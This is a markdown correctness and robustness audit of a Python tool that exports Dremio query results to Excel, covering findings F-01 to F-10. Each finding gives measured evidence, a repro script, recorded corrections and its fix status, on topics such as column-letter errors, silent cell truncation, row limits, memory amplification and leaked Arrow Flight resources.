# Correctness & Robustness Audit — `dremio_Tool/`

Companion to [`INVENTORY.md`](INVENTORY.md). Structure is not re-derived here.

**Environment:** Python 3.12.1, pandas 3.0.5, pyarrow 25.0.1, openpyxl 3.1.5,
numpy 2.5.2. When this audit was written these were merely whatever a fresh
`pip install -r requirements.txt` happened to resolve to, because every floor in
that file was an unbounded `>=`. They are now **exact pins** (F-32), so the
numbers in this document have a recorded runtime behind them.

> **Environment change since the findings were written.** When this audit was
> produced there was **no display server**, and that single fact is why nine
> findings rested on reading control flow rather than running anything. Xvfb is
> now installed, so every GUI finding is reproducible:
>
> ```bash
> sudo apt-get update && sudo apt-get install -y xvfb
> xvfb-run -a python -c "import tkinter; r = tkinter.Tk(); print('Tk OK', r.winfo_screenwidth())"
> ```
>
> **This is not part of the repository and does not survive a Codespace
> rebuild.** If the repro suite starts reporting `STILL BLOCKED`, reinstall it —
> that is the first thing to check, not a regression in the app. The install
> command and a fuller note are in
> [`dremio_Tool/tests/README.md`](../../dremio_Tool/tests/README.md).
>
> Measured under Xvfb: 1280×1024, Tcl 8.6.14, `tcl_platform(threaded) = 1`. That
> last value matters for F-12 and is worth re-checking on any new machine.

**Severity scale**

| Level | Meaning |
|---|---|
| **Critical** | Silent data loss/corruption, or credential exposure |
| **High** | Export fails or app becomes unusable on a path a normal user reaches |
| **Medium** | Wrong behaviour on a reachable-but-less-common path; recoverable |
| **Low** | Cosmetic, hygiene, or requires unusual input |

**Evidence tags.** Every finding carries one. They are not interchangeable, and
a downstream reader should treat them differently:

| Tag | Meaning | Confidence |
|---|---|---|
| **EXECUTED** | Code was run and the stated output observed. Numbers quoted are measurements. | Highest — reproducible |
| **STATIC** | Automated analysis over the real source (AST sweep, grep). The *source* is ground truth; the app's runtime behaviour was not exercised. | High for "this code exists / does not exist"; says nothing about runtime |
| **SOURCE** | Established by reading control flow and reasoning about it. Not mechanically verified. | Lowest — **verify before acting** |

A finding tagged `EXECUTED + SOURCE` has a measured core and a reasoned
consequence; the body says which part is which.

Findings are numbered in discovery order, not severity order. An index by
severity is at the end.

---

## Stage 1 outcome — where every finding stands

**Every finding carries a `### Status:` block in its own section.** This table is
the summary; the block is the record of what was done and why.

| | Count |
|---|---|
| Findings | **34** (33 from the audit + F-34, a later parity backport) |
| **FIXED** | **33** |
| **OPEN by decision** | **1** — F-28's reversible-encoding half |
| Have an executable repro | 30 scripts covering 34 findings |

`run_all.py` reports **33 NOT REPRODUCIBLE, 1 CONFIRMED**. That one CONFIRMED is
**F-28 (encoding)** and it is the correct result, not a regression: the base64
file fallback is being kept, and the decision taken was to make the README honest
about it rather than to add encryption. It is expected to stay CONFIRMED until
somebody revisits that decision. **A clean run of this suite is 33/1, not 34/0.**

> **F-34 was added on 2026-08-19**, after the audit proper, to bring the GUI to
> parity with the `dremio_excel` skill (its A-01). It is a genuine new safeguard
> (formula/CSV injection, CWE-1236), not an audit finding — its block is at the
> end of this document. Earlier prose that says "33 findings" / "32 NOT
> REPRODUCIBLE" describes the audit before that backport and is left as the
> dated record it is.

Two conventions this document follows, both learned the hard way:

- **A repro must be shown to fail against the pre-fix code**, by stashing the
  change and re-running. A repro that cannot tell fixed from broken launders an
  assumption as evidence, and two of them silently passed against a broken build
  before this became routine — F-22's grepped for the machinery it was checking,
  and F-08's had a hardcoded verdict.
- **Corrections to a finding are recorded, not overwritten.** Where running the
  code contradicted the audit's own reasoning — F-10's leak, F-12's severity,
  F-08's copy #1 — the original claim and the correction both stay on the page.

---

## Stage 0 update — SOURCE findings converted to EXECUTED

**All nine SOURCE-only findings are now EXECUTED.** Xvfb was installed, so Tk
runs headless; and `dremio_Tool/tests/flightserver.py` stands up a local Arrow
Flight server that the app's own `connect()` authenticates against, which
removed the need for a live Dremio endpoint that this document originally
expected to be blocking.

| | Before Stage 0 | After |
|---|---|---|
| SOURCE-only findings | 9 | **0** |
| Findings with an executable repro | 1 | **23** |

Converted: F-07, F-13, F-14, F-15, F-17, F-19, F-22, F-29, F-30 — plus the
SOURCE consequence-halves of F-04, F-08, F-16, F-24, F-27.

Every finding below now carries a **Reproduced by** line. The whole suite runs
with one command and takes about 70 seconds:

> **Correction (2026-08-19):** that 70 seconds was the Stage-0 suite of 23
> scripts. Re-measured against the 29 scripts it grew into (30 since F-34), a
> full run is **402 s** — `repro_f33` alone accounts for 314 s of it.
> `CLAUDE.md`'s "~7 min" is the figure to trust.

```bash
python dremio_Tool/tests/run_all.py
```

The scripts drive the **real source** rather than a transcription of it, so when
a Stage 1 fix lands the corresponding script flips to `NOT REPRODUCIBLE` on its
own. See [`dremio_Tool/tests/README.md`](../../dremio_Tool/tests/README.md).

**Corrections this produced** — details in each finding:

- **F-08** — the `self_destruct=True is defeated` claim was overstated as
  written; measured, the `table` local pins 3.8–5.0 MB, not a full copy. The
  concurrency question the finding flagged as unresolved is now answered: the
  copies *are* concurrent.
- **F-16, F-04** — the error dialog these findings say the user is shown often
  never appears at all, because of **F-33** below.
- **F-27** — the Tk semantics claim was correct; `Combobox.current()` does
  return the right index despite duplicate labels.
- **F-33 — NEW, High.** Error dialogs on every failure path in `_connect_thread`
  and `_execute_thread` raise `NameError` instead of displaying.

---

## Findings

### F-01 — Column-letter formula is wrong for every index ≥ 52 · **High**

**Evidence: EXECUTED**

**File:** [app.py:767](../../dremio_Tool/app.py#L767)

```python
col_letter = chr(65 + idx) if idx < 26 else f"A{chr(65 + idx - 26)}"
```

The `else` branch only ever produces `A?`, so it is correct for columns 27–52
(`AA`–`AZ`) and wrong for everything beyond. At `idx = 52` it emits `A[`, then
`A\`, `A]`, `A^`, `A_`… — non-letters. openpyxl's
`ColumnDimension` rejects the key with `ValueError`.

**Reproduced by:** `dremio_Tool/tests/repro_f01_f02_column_letters.py`
(supersedes the original `repro_column_bug.py`, which reimplemented the formula
standalone; this one drives the real `_export_to_excel`). Re-confirmed in
Stage 0: a 60-column export raises `ValueError: 'A[' is not a valid column name`,
and the formula diverges from `get_column_letter` for **948 of the first 1000
indices**.

### Status: FIXED (Tier 2)

Replaced with openpyxl's own `get_column_letter(idx + 1)`. Fixed together with
F-02, F-06 and four of F-12's six reads, because all four defects lived in the
same fourteen lines of the auto-fit block.
`repro_f01_f02_column_letters.py`: **NOT REPRODUCIBLE**.

**How a user reaches it:** connect, run any `SELECT` returning 53 or more
columns (e.g. `SELECT *` on a wide table), leave "Auto-fit columns" checked —
it is checked by default. The export raises before the file is finalised.

**Aggravating factor:** the exception is thrown inside the
`with pd.ExcelWriter(...)` block, so it interacts with F-11 (partial file left
on disk).

> **Correction (Stage 0) — the error dialog usually does not appear.** Measured
> over 5 trials of the real failure path: **1/5**. See **F-33**. What the user
> reliably gets is a log-panel line and a progress label reading "Error"; the
> modal dialog this finding assumes is mostly absent. Compounded with F-11, the
> observable result is an export that appears to stop for no stated reason,
> leaving a plausible-looking corrupt `.xlsx` at the expected path.

---

### F-02 — Auto-fit width is `nan` on a zero-row result set · **Medium**

**Evidence: EXECUTED**

**File:** [app.py:763-766](../../dremio_Tool/app.py#L763-L766)

```python
max_len = max(self.df[col].astype(str).map(len).max(), len(str(col))) + 2
```

On an empty Series, `.max()` returns `nan`. `max(nan, 1)` returns `nan` (Python
`max` compares left-to-right and every comparison with `nan` is `False`), so the
column width is set to `nan`.

**Reproduced by:** `dremio_Tool/tests/repro_f01_f02_column_letters.py`.

### Status: FIXED (Tier 2)

`.max()` on an empty Series is guarded with `pd.isna` and falls back to 0, so
the width is now computed from the header alone. A zero-row export writes
`width="3"` for a one-character column name instead of `width=""`.
`repro_f01_f02_column_letters.py`: **NOT REPRODUCIBLE**.

**How a user reaches it:** any query with a `WHERE` clause matching no rows —
routine when checking whether data exists. The export "succeeds"; the damage
lands in the file.

**What actually lands in the file** — measured, `<cols>` element of the written
sheet:

```xml
<cols><col width="" customWidth="1" min="1" max="1" /></cols>
```

`width=""` is not a valid `xsd:double`. openpyxl round-trips it, so the bug is
invisible to any Python re-read; it is Excel that has to decide what to do with
an empty numeric attribute. Zero-row exports therefore ship a schema-invalid
worksheet.

---

## Excel output limits

What the app *does* at each ceiling, verified by running the real
`_export_to_excel` body against synthetic frames.

### F-03 — Cell contents over 32,767 chars are silently truncated · **Critical**

**Evidence: EXECUTED**

**File:** [app.py:756](../../dremio_Tool/app.py#L756)

| Input cell length | Result |
|---|---|
| 32,767 | written intact |
| 32,768 | **saved OK**, reads back at 32,767 — 1 char destroyed |
| 40,000 | **saved OK**, reads back at 32,767 — 7,233 chars destroyed |

openpyxl does not raise. It emits a Python `UserWarning` ("Cell contents too
long (40000), truncated to 32767 characters") and writes the truncated value.

**Reproduced by:** `dremio_Tool/tests/repro_f03_cell_truncation.py`. Stage 0
re-measured through the real `_export_to_excel`: **7,234 characters destroyed**
across the three cells (1 + 7,233), openpyxl emitted 2 `UserWarning`s, and a
re-check of the live source confirms the app still installs no warnings filter
or logging handler.

**The app never sees that warning.** No `warnings` filter, no logging handler,
no `warnings.catch_warnings` anywhere in the codebase — it goes to `stderr`,
which a `pythonw`/PyInstaller windowed build (the documented packaging mode,
`README.md:215`) does not have. The user is shown the standard green success
dialog reporting the full row count.

**How a user reaches it:** any Dremio column holding a long text blob — JSON
payloads, log lines, concatenated descriptions, `LISTAGG` output. Nothing warns
them, at export time or after.

**Severity rationale:** this is the only finding where the app reports success
while destroying data, with no signal on any channel the user can observe.

### Status: FIXED (Tier 1) — contract: spill to a sidecar

The truncation itself cannot be removed; 32,767 characters is Excel's limit and
openpyxl will always write at most that. What made this Critical was the
silence, and that is what the fix addresses. Chosen from the three options the
handoff put on the table, in preference to failing the export outright (which
would block a million-row extract over one cell) or warning without preserving
anything (which still delivers lossy data).

`_find_oversized_cells` scans text columns before the write - positionally, so
duplicate column names (F-06) do not turn into a second failure, and skipping
non-text dtypes so no numeric column pays for a string cast. Every affected
value is then written in full to `<workbook-stem>.truncated.txt` beside the
workbook, incrementally rather than assembled in memory, since these values are
by definition large. The user gets a warning dialog naming the affected cells
*before* the success dialog, per-cell lines in the log, and a note appended to
the success dialog itself.

A failure to write the sidecar does not fail an export that otherwise succeeded
— the workbook is already on disk and still useful — but the message then says
plainly that the characters were lost.

Verified end to end: 7,234 characters still cut from the workbook, and all of
them recovered byte-for-byte from the sidecar; warning dialog, log lines and
success-dialog note all present. `repro_f03_cell_truncation.py` was rewritten to
test the *contract* rather than the truncation, and now reports **NOT
REPRODUCIBLE**. Measured cost: F-08's amplification is unchanged at 33×.

Note this fix depended on **F-33** landing first. The warning is delivered by a
`root.after` lambda on the same path whose dialogs were failing 4 times in 5.

---

### F-04 — Row ceiling: export dies with a raw openpyxl error · **Medium**

**Evidence: EXECUTED + STATIC** *(was EXECUTED + SOURCE)*

**Reproduced by:** `dremio_Tool/tests/repro_f04_row_ceiling.py`. Stage 0
confirmed the boundary and the header offset by execution, and the "no
row-count check" half by an automated re-scan of the live source — no comparison
against the sheet ceiling exists anywhere.

> **Correction (Stage 0).** The claim below that the `ValueError` "is shown
> verbatim in a messagebox" is now known to be optimistic. Per **F-33**, the
> `messagebox.showerror` call on this path is a lambda capturing the
> except-clause name and dispatched after the block ends, so it frequently
> raises `NameError` and shows nothing at all. The user may get no dialog
> whatsoever — only a small progress label reading "Error".

**File:** [app.py:756](../../dremio_Tool/app.py#L756)

The app performs **no row-count check**. `df.to_excel` writes the header at
sheet row 1 and data at rows 2…N+1 (verified: a 3-row frame yields
`ws.max_row == 4`). openpyxl enforces the ceiling at cell-construction time:

```
ws.cell(row=1048576) -> accepted
ws.cell(row=1048577) -> ValueError: Row numbers must be between 1 and 1048576.
                        Row number supplied was 1048577
```

So the true limit is **1,048,575 data rows**, one less than the sheet ceiling
because of the header. Row 1,048,576 is the first one that fails.

**What the app does:** nothing until the write is already underway. The
`ValueError` propagates out of `to_excel`, is caught by the generic handler at
[app.py:734](../../dremio_Tool/app.py#L734), and is shown verbatim in a
messagebox — a message about "row numbers" that never mentions Excel's limit or
suggests adding a `LIMIT` clause. The partial file from F-11 is left behind.

**How a user reaches it:** `SELECT * FROM <fact_table>` without a `LIMIT`. The
app's own `DEFAULT_QUERY` includes `LIMIT 100`, but nothing enforces it. The
full result set is fetched and converted first, so the user pays the entire
query, transfer, and conversion cost before learning it cannot be written.

---

### Status: FIXED (Tier 5)

`_check_row_ceiling` refuses an over-limit frame **before anything is created on
disk**, and the message names the worksheet limit, the usable row count, how many
rows too many, and the LIMIT clause. openpyxl's own error mentions none of them
and arrives with a partial workbook already written.

The usable limit is 1,048,**575**, not the 1,048,576 the sheet advertises: the
header occupies row 1. Tested against openpyxl's own boundary in both directions.

> **The repro had to be rewritten before it meant anything.** It checked the
> guard by *grepping the source* for a row-ceiling comparison — the same trap
> F-22's repro fell into, since it would report the guard present the moment the
> constant was added. It now drives the real export one row over the limit.

Verified: `repro_f04_row_ceiling.py`: **NOT REPRODUCIBLE**.

### F-05 — Characters openpyxl rejects abort the export · **Medium**

**Evidence: EXECUTED**

**File:** [app.py:756](../../dremio_Tool/app.py#L756)

Measured, per character class:

| Character | Result |
|---|---|
| `\x00` NUL | `IllegalCharacterError` |
| `\x07` BEL | `IllegalCharacterError` |
| `\x0b` VT | `IllegalCharacterError` |
| `\x1f` US | `IllegalCharacterError` |
| `\t`, `\n` | accepted |
| emoji (non-BMP) | accepted |

**What the app does:** no sanitisation, no `sanitise`/`re.sub`/`ILLEGAL_
CHARACTERS_RE` call anywhere in the codebase. The exception reaches the generic
handler and the user sees a dialog reading:

> `ab cannot be used in worksheets.`

The message names neither the column, nor the row, nor the offending byte — and
the control character is invisible in the dialog, so the two strings in that
message look identical to the user. There is no practical way to find the bad
cell from the UI.

> **Correction (Stage 0) — the dialog usually does not appear at all.** Measured
> over 5 trials of the real failure path: **1/5**. See **F-33**. So the finding
> is worse than written: the complaint was that the message is unhelpful, but
> four times in five there is no message. The user gets a log-panel line and a
> progress label reading "Error", with the control character equally invisible
> there.

**How a user reaches it:** control bytes in text columns are common in data
imported from mainframe extracts, fixed-width files, or anything that has been
through a `CHAR(n)` padding scheme. This applies equally to **column names**
(verified separately) — a rejected header kills the export the same way.

---

### Status: FIXED (Tier 5)

Contract matches F-03 — **replace and report**, never silently. Failing throws
away a query the user has already paid for; stripping in silence is the one
option F-03 took off the table.

- openpyxl's own `ILLEGAL_CHARACTERS_RE` is imported rather than restated, so the
  two cannot disagree about which bytes those are. TAB, LF and CR survive: Excel
  permits them and they carry meaning.
- **Column names are sanitised too.** A rejected header kills the export exactly
  as a cell does, and the header was what failed first in testing.
- `self.df` is never mutated and only affected columns are copied, so the common
  path copies nothing — this runs on frames F-08 measured at 33× amplification.
- `map()` runs over the original values, not the str-cast, or every NaN in an
  object column would be written as the string `'nan'`.

Verified: `repro_f05_illegal_characters.py`: **NOT REPRODUCIBLE**.

> **Noted, not fixed, and not one of the 33 findings:** the app still has no
> handling for timezone-aware timestamps, so openpyxl's raw `ValueError` reaches
> the user the way F-04's and F-05's used to. Dremio serves `TIMESTAMP WITH TIME
> ZONE`, so a plain `SELECT` reaches it. It is now F-11's repro trigger, which is
> how it came to light.

### F-06 — Duplicate column names crash the auto-fit loop · **High**

**Evidence: EXECUTED**

**File:** [app.py:764](../../dremio_Tool/app.py#L764)

```python
max_len = max(self.df[col].astype(str).map(len).max(), len(str(col))) + 2
```

When two columns share a name, `self.df[col]` returns a **DataFrame**, not a
Series. `.astype(str).map(len).max()` then yields a *Series* of per-column
maxima, and `max(Series, int)` raises:

```
ValueError: The truth value of a Series is ambiguous.
            Use a.empty, a.bool(), a.item(), a.any() or a.all().
```

**Reproduced by:** `dremio_Tool/tests/repro_f06_duplicate_columns.py`, which
runs both the failure and the control against the real `_export_to_excel`.

### Status: FIXED (Tier 2)

The auto-fit loop now uses `self.df.iloc[:, idx]`, which always returns a
Series regardless of duplicate labels. `repro_f06_duplicate_columns.py`:
**NOT REPRODUCIBLE**.

**Isolated by execution:** with auto-fit off, the same frame exports fine
(`to_excel` alone: OK, shape `(1, 2)`). The fault is entirely in the auto-fit
loop, not in pandas' Excel writer.

**How a user reaches it:** `SELECT a.id, b.id FROM a JOIN b ON …` — Dremio
returns both columns as `id`. This is one of the most ordinary queries a user
can write, and auto-fit is on by default. The error message mentions pandas
Series internals and gives no hint that the cause is a duplicate column name.

> **Correction (Stage 0) — the dialog never appeared.** Measured over 5 trials
> of the real failure path: **0/5**, the worst rate of any path tested. See
> **F-33**. On the most ordinary failing query in the application — a JOIN
> returning two columns of the same name — the user gets no dialog at all: a
> log-panel line and a progress label reading "Error".

---

### F-07 — Sheet-name rules: not reachable, but the config lies · **Low**

**Evidence: EXECUTED** *(was SOURCE)*

**Reproduced by:** `dremio_Tool/tests/repro_f07_sheet_name.py`. Stage 0 proved
the inertness behaviourally rather than by reading: a legal configured
`sheet_name` (`'Dremio Data'`) **and** one Excel forbids outright
(`'bad[name]:*?/\'`) were both written to `config.json` and both ignored — the
written workbook contains a single sheet named `Data` in each case, with no
error and no validation, because nothing reads the value.

**File:** [app.py:756](../../dremio_Tool/app.py#L756),
[constants.py:83](../../dremio_Tool/constants.py#L83)

The sheet name is the hardcoded literal `'Data'` — 4 chars, no `[ ] : * ? / \`.
**None of the sheet-name rules are reachable**, because no user input ever
reaches that argument. This is the one Excel limit the app is accidentally safe
from.

The hazard is latent rather than live: `DEFAULT_CONFIG['output']['sheet_name']`
= `'Dremio Data'` exists and is persisted to `config.json`, so a user who edits
that file to something Excel rejects will see no effect at all — the setting is
never read (proven dead in F-26). Wiring it up later without adding validation
would open all six sheet-name rules at once.

---

### Status: FIXED (Tier 5) — wired up, not deleted

`output.sheet_name` is read and honoured, so the config no longer lies. Wiring it
up rather than deleting it matches the F-31 decision: a setting that exists and
works is worth more than one that never existed.

**The audit's warning was the real work.** openpyxl does **not** enforce Excel's
sheet-name rules, measured against 25.0.1 rather than assumed: it rejects an
empty name and the six forbidden characters, but **accepts** a name over 31
characters (a `UserWarning`, to a stderr a windowed build does not have), a
whitespace-only name, a leading or trailing apostrophe, and `History`, which
Excel reserves. Those are the dangerous ones — the export reports success and
Excel then refuses the file or silently repairs it. Six such cases were expected
to be three; whitespace-only was not one anybody had listed.

A bad configured value does not fail the export: it is reported and `Data` is
written instead.

> **A regression this caused, caught by the full suite.** `DEFAULT_CONFIG` said
> `Dremio Data` while the writer said `Data`, so honouring the setting renamed
> the sheet for every existing user — breaking any formula, Power Query or macro
> referring to it. The shipped default is now `Data`, and a stored
> `Dremio Data` is migrated once on load. The migration runs on the raw parsed
> file **before** `_merge_with_defaults`, and that ordering is load-bearing: the
> merge back-fills the version stamp, so a migration running after it would see
> the current version on a file that had never been migrated and never fire.

Verified: `repro_f07_sheet_name.py`: **NOT REPRODUCIBLE**. The old repro asserted
the *opposite* of this fix — its NOT REPRODUCIBLE branch was a warning that said
"if this were wired up it would need validation", checking none.

## Memory profile of the export path

### F-08 — 32× peak-memory amplification between `read_all()` and the file · **High**

**Evidence: EXECUTED** *(was EXECUTED + SOURCE)*

**Reproduced by:** `dremio_Tool/tests/repro_f08_memory_amplification.py`, which
re-measures the whole path through real app code — `read_all()` over Arrow
Flight, the real `_arrow_to_pandas`, the real `_export_to_excel` — with the
Flight server in a **separate process**, because an in-process one holds its own
full copy of the served table inside the process being measured.

> **Stage 0 resolution of this finding's own caveat.** The open question was
> whether the amplification reflects concurrent residency or merely summed
> sequential peaks. It is **concurrent**. Sampling current RSS from
> `/proc/self/statm` — which falls when memory is released, unlike `ru_maxrss` —
> alongside the high-water mark:
>
> | | Measured |
> |---|---|
> | peak RSS growth (`ru_maxrss`, the audit's metric) | 539 MB |
> | **max concurrent residency** (`/proc/self/statm`) | **527 MB** |
> | gap | 78 MB |
>
> A 78 MB gap against a 604 MB high-water means the copies really are alive at
> the same time. Amplification re-measured at **33×** vs Arrow buffers and 128×
> vs the output file — consistent with the 32× originally reported. Measured
> cost is **558 bytes per cell**, projecting **~5.2 GB** for a 1,000,000 × 10
> export, which is the figure Tier 3 should design against.

**EXECUTED — the table below.** Measured end-to-end on a 100,000 × 10 string
frame (14 MB of Arrow buffers) along the real call path.

**Read this table as peak growth, not concurrent residency.** The metric is
`ru_maxrss`, a **monotonic high-water mark** for the process: it never
decreases, so each Δ is "how much the peak rose by this stage," not "how much
this stage had resident at that moment." A stage whose allocations were freed
before the next sample still shows its Δ. The table therefore proves the
*total* amplification and identifies which stage dominates it — it does **not**
by itself prove that any two copies were alive simultaneously.

| # | Copy | Created at | Peak RSS | Δ |
|---|---|---|---|---|
| — | baseline | — | 105 MB | — |
| 1 | **Arrow `Table`** from `reader.read_all()` | [connection.py:339](../../dremio_Tool/connection.py#L339) | 146 MB | +41 |
| 2 | **Cast Arrow `Table`** — `table.cast(new_schema)` | [connection.py:372](../../dremio_Tool/connection.py#L372) | 153 MB | +7 |
| 3 | **pandas `DataFrame`** — `.to_pandas(...)` | [connection.py:372](../../dremio_Tool/connection.py#L372) | (same) | |
| 4 | **openpyxl `Workbook`** — one `Cell` object per value | [app.py:756](../../dremio_Tool/app.py#L756) | 456 MB | **+303** |
| 5 | **`astype(str)` + `.map(len)`** — two transient full-length Series, per column | [app.py:764](../../dremio_Tool/app.py#L764) | 468 MB | +12 |
| 6 | **XML serialisation + zip buffers** on `__exit__` | [app.py:773](../../dremio_Tool/app.py#L773) | 556 MB | +88 |

**Final file on disk: 2.5 MB. Peak RSS attributable to the export: 451 MB —
32× the source Arrow buffers, 180× the output file.**

**SOURCE — explicit count of simultaneously-live full copies.** The counts below
are derived from **object lifetime in the code** (what is still bound to a live
name at each point), *not* from the `ru_maxrss` table above, which cannot
distinguish concurrent residency from sequential peaks. They differ by phase,
and the second phase is the expensive one:

*During conversion* (inside `execute_query`) — **3 live at once**:
1. `table`, bound to a local for the whole function body
2. `table.cast(new_schema)`, the unnamed temporary
3. the `DataFrame` being materialised

*During export* (inside `_export_to_excel`) — **3 live at once**, plus a
transient:
1. `self.df` — the DataFrame
2. the openpyxl `Workbook`, the dominant term at ~300 bytes per cell
3. the XML/zip buffers built during save
   (+ the per-column `astype(str)` pair, one column at a time)

**`self_destruct=True` is partly defeated — corrected in Stage 0.**
[connection.py:372](../../dremio_Tool/connection.py#L372) passes
`self_destruct=True`, whose purpose is to free Arrow buffers incrementally as
they are converted. It can only free the *cast* table's chunks; copy #1 is still
bound to the `table` local in the enclosing frame.

> **Correction.** The original wording — that copy #1 "stays fully resident" —
> overstates it. Measured with `pa.total_allocated_bytes()` (RSS is the wrong
> instrument: CPython and glibc do not return freed pages promptly, so an
> RSS-based probe reports "0 MB freed" in every case regardless of the truth),
> releasing the `table` local after conversion frees:
>
> | Schema | Still pinned by copy #1 |
> |---|---|
> | no decimal columns (cast is a no-op) | **3.8 MB** |
> | one `decimal128` column (cast materialises) | **5.0 MB** |
>
> So the local does retain buffers and the optimisation is indeed not fully
> effective — but the retention is single-digit MB, not a second full copy. This
> matters for Tier 3: **copy #1 is not where the memory goes.** The workbook is.
> It accounts for +352 MB of the 539 MB, versus 50 MB for the entire
> Arrow→pandas conversion. A fix that restructures the conversion to release
> copy #1 sooner would recover a few MB; only `write_only=True` or a streaming
> writer addresses the actual cost.

**`self.df` is never released.** [app.py:714](../../dremio_Tool/app.py#L714)
assigns the result to `self.df` and nothing ever clears it — not on error, not
after export, not on disconnect. The previous result set stays resident for the
life of the process, so running a second large query means peak #4 of the new
export coexists with the whole of the old DataFrame.

> **Confirmed by execution.** An AST scan (not a grep — `__init__` sets
> `self.df = None` at [app.py:71](../../dremio_Tool/app.py#L71), which is
> initialisation, not release) finds **no assignment of `self.df = None` outside
> the constructor**, and `app.df` is still populated after a completed export.

**Consequence:** a result set that Dremio delivers in 14 MB needs ~450 MB to
export. Extrapolating the measured per-cell cost, a 1-million-row × 10-column
export needs roughly 4.5 GB of RSS — on a 32-bit PyInstaller build it cannot
complete at all, and on a standard 8 GB corporate laptop it will page heavily or
be OOM-killed. There is no streaming path and no `write_only=True` workbook
mode in use.

### Status: FIXED (Tier 3)

Both halves. The rows are streamed through a `write_only` workbook instead of
`df.to_excel`, and `_execute_thread` releases the frame in its `finally`.

Measured on the same 100,000 × 10 frame, by stashing the fix and re-running:

| | before | after |
|---|---|---|
| **the export stage alone** | 432 MB | **36 MB** |
| per cell | 453 bytes | **37 bytes** |
| whole path, peak growth over baseline | 495 MB | 105 MB |
| amplification vs Arrow buffers | 31× | **7×** |
| projected peak, 1,000,000 × 10 | 4.8 GB | **1.0 GB** |
| `app.df` after a completed run | still populated | `None` |

The export stage is the number this finding is about: everything before it is
the cost of having the data at all. What remains after the fix is mostly the
DataFrame, which the app cannot do without.

**Three consequences of owning the write loop**, none of them obvious:

- **pandas cannot be asked to do this.** Its openpyxl writer assigns cells by
  coordinate and a `WriteOnlyWorksheet` has no `.cell`, so the rows are appended
  directly. `itertuples`, not `iterrows` — the latter builds a Series per row,
  reintroducing the per-row allocation the change exists to remove.
- **Values must be converted first**, which `to_excel` used to do. openpyxl
  raises on `pd.NA`, `NaT` and numpy scalars, so `_excel_value` is not optional
  — and getting it subtly wrong would change exported data silently. This is the
  real risk of the change, so the repro writes the same frame **both ways** and
  requires the two workbooks to read back identical in **value and type** across
  text, nullable `Int64`, float `NaN`, datetime/`NaT`, bool-with-`None`,
  `Categorical` and `Decimal`. 40 of 40 cells match. pandas is the specification
  here: there is no document saying what a `pd.NA` should look like in a
  worksheet, only the behaviour this app shipped with.
- **Column widths and `freeze_panes` must be set before the first row** — a
  write_only sheet has already streamed past them afterwards.

> **A cross-check that would have gone quietly wrong.** The old code reconciled
> the pre-write scan against openpyxl's "Cell contents too long" `UserWarning`
> (the F-03 cross-check). That warning does not exist on this path — measured:
> openpyxl's `Cell.check_string` slices the value and returns silently, and the
> message the old code matched on came from **pandas'** writer, which is no
> longer in the write path. Kept as-is it would have reported zero truncations
> against every scan that found some, telling the user on every truncating
> export that the sidecar might be incomplete when it was fine. It is replaced
> by counting over-length values as they are handed to openpyxl — a better
> cross-check than the warning was, and only possible because this code now owns
> the loop.

**Not fixed, deliberately:** the `self_destruct=True` question above. Stage 0
established the `table` local pins 3.8 MB (no decimals) to 5.0 MB (one
`decimal128` column) — real, but three orders of magnitude off the workbook, and
this finding's own correction says so. Re-measured unchanged and left on the
record rather than asserted on.

Verified: `repro_f08_memory_amplification.py`: **NOT REPRODUCIBLE**, and
**CONFIRMED** again with the fix stashed (453 bytes per cell against a 100-byte
budget, frame not released).

---

## Resource handling

### F-09 — `FlightClient` is never closed; `disconnect()` only drops the reference · **Medium**

**Evidence: EXECUTED + STATIC**

**Reproduced by:** `dremio_Tool/tests/repro_f09_f10_resource_release.py`, which
does not grep for a `close()` call but asks the client: after `disconnect()` the
captured client still served an RPC, where a closed one raises
`ArrowInvalid("FlightClient is closed")`. The script also covers the second
replacement path the entry does not mention — **`connect()` over an existing
client**, reachable without ever pressing Disconnect, since a failed attempt
leaves a half-built client that the next attempt overwrites.

**File:** [connection.py:296-303](../../dremio_Tool/connection.py#L296-L303)

```python
def disconnect(self):
    self.client = None
    ...
```

`pyarrow.flight.FlightClient` has a `close()` method and supports the context
manager protocol (both verified present in pyarrow 25.0.1). Neither is used —
**`grep` finds no `.close()` call anywhere in the application**. The gRPC
channel and its transport threads are left for the garbage collector.

**How a user reaches it:** connect → disconnect → connect, repeatedly, over a
long session. Each cycle leaks a channel until GC happens to run.

---

### Status: FIXED (Tier 5)

Both replacement paths go through `_release_client()`, which cancels any live
read first — closing a channel under one would fault it — and swallows a failed
close, since this runs on teardown paths where raising would replace a leaked
channel with a leaked channel *and* a broken teardown.

Observed rather than grepped: a closed client raises
`ArrowInvalid("FlightClient is closed")`, where the pre-fix client still served
an RPC after `disconnect()`.

Verified: `repro_f09_f10_resource_release.py`: **NOT REPRODUCIBLE**.

### F-10 — Flight readers leak on the error path · **Medium**

**Evidence: EXECUTED** *(was EXECUTED + SOURCE)*

**Reproduced by:** `dremio_Tool/tests/repro_f09_f10_resource_release.py`.

> **Correction — this entry overstated the consequence.** Measured against a
> local Flight server, the abandoned reader is **not** simply "left for the
> garbage collector". It is freed by **refcounting**, and that is prompt: the
> reader is held only by the frames of `execute_query` and `_read_stream`, which
> are held only by the traceback of the exception that unwound them. Drop the
> exception and the frames go with it, the reader's destructor runs, and the
> stream is released at once — the server sent **1** further batch. Keep the
> exception and the frames stay alive: the server sent **29** further batches
> into a stream nobody was reading, matching a deliberately abandoned control.
>
> [app.py:1096](../../dremio_Tool/app.py#L1096) binds `str(e)` and does not
> retain `e` — a habit adopted for F-33 — so the shipped app fell on the lucky
> side of this. **F-10 was therefore latent, not active**, and the fix is a
> determinism fix: it makes release deliberate rather than contingent on
> refcount timing and on no error handler ever holding a traceback.
>
> The severity stays Medium: the mechanism is real, the failure is silent, and
> "correct only by accident of CPython's collector" is not a property worth
> relying on. But the original wording implied an unbounded leak in ordinary
> use, and that is not what happens.

**Files:** [connection.py:293-294](../../dremio_Tool/connection.py#L293-L294),
[connection.py:338-339](../../dremio_Tool/connection.py#L338-L339)

```python
reader = self.client.do_get(info.endpoints[0].ticket, options)
table = reader.read_all()
```

If `read_all()` raises — a mid-stream Flight error, a server timeout, a memory
failure during conversion — `reader` is abandoned with the stream still open.
`_test_connection` has the identical pattern.

**There is a release mechanism, and the app does not use it.** Probed against
pyarrow 25.0.1:

| Member | Present |
|---|---|
| `FlightStreamReader.cancel()` | **yes** — *"Cancel the read operation."* |
| `FlightStreamReader.read_chunk()` | **yes** |
| `FlightStreamReader.close()` | no |
| `__enter__` / `__exit__` | no |

So the correct handling is a `try/finally` calling `reader.cancel()`, which
tears down the server-side stream instead of leaving it to the garbage
collector. `close()` and the context-manager protocol are genuinely absent —
`cancel()` is the release primitive for this type.

